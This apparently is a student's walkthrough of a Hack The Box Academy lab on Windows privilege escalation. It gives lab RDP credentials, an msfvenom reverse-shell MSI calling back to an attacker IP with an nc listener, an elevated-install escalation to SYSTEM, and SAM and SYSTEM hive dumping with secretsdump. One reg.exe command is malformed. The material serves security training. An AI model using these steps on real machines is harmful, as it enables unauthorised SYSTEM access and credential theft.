As an add-on to their annual penetration test, the INLANEFREIGHT organization has asked you to perform a security review of their standard Windows 10 gold image build currently in use by over 1,200 of their employees worldwide. The new CISO is worried that best practices were not followed when establishing the image baseline, and there may be one or more local privilege escalation vectors present in the build. Above all, the CISO wants to protect the company's internal infrastructure by ensuring that an attacker who can gain access to a workstation (through a phishing attack, for example) would be unable to escalate privileges and use that access move laterally through the network. Due to regulatory requirements, INLANEFREIGHT employees do not have local administrator privileges on their workstations.

You have been granted a standard user account with RDP access to a clone of a standard user Windows 10 workstation with no internet access. The client wants as comprehensive an assessment as possible (they will likely hire your firm to test/attempt to bypass EDR controls in the future); therefore, Defender has been disabled. Due to regulatory controls, they cannot allow internet access to the host, so you will need to transfer any tools over yourself.

Enumerate the host fully and attempt to escalate privileges to administrator/SYSTEM level access.

Question 1 - Find left behind cleartext credentials for the iamtheadministrator domain admin account.
xfreerdp /v:10.129.43.33 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop


Question 2 -  Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop
1) msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.15.183 lport=4444 -f msi -o aie.msi

2) this is an elevated install 
3) have nc -nlvp 4444 open on host machine 
4) transfer the aie.msi file to RDP session 
5) right click on it in file explorer and hit "Install" 
6) catch nt authroity \ system shell 
7) type C:\Users\Administrator\Desktop\flag.txt

Question 3 - There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account.
1) in elevated shell run following commands: 

reg.exe save hklm\sam C:\Users\public\sam.save
reg.exe save hklm\system C:\Users\public\system.save
reg.exe save hklm\securityC:\Users\public\security.save
2) transfer these files to kali machine then run ->

3) impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
